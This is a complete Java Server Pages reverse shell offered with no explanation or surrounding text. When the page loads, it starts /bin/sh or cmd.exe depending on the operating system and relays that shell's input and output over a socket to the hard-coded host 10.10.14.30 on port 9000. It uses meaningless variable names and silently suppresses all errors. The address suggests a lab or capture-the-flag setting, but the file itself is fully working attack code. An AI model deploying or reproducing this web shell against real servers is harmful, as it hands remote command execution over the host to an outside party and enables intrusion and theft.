<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream rg;
    OutputStream zj;

    StreamConnector( InputStream rg, OutputStream zj )
    {
      this.rg = rg;
      this.zj = zj;
    }

    public void run()
    {
      BufferedReader io  = null;
      BufferedWriter obs = null;
      try
      {
        io  = new BufferedReader( new InputStreamReader( this.rg ) );
        obs = new BufferedWriter( new OutputStreamWriter( this.zj ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = io.read( buffer, 0, buffer.length ) ) > 0 )
        {
          obs.write( buffer, 0, length );
          obs.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( io != null )
          io.close();
        if( obs != null )
          obs.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.14.30", 9000 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
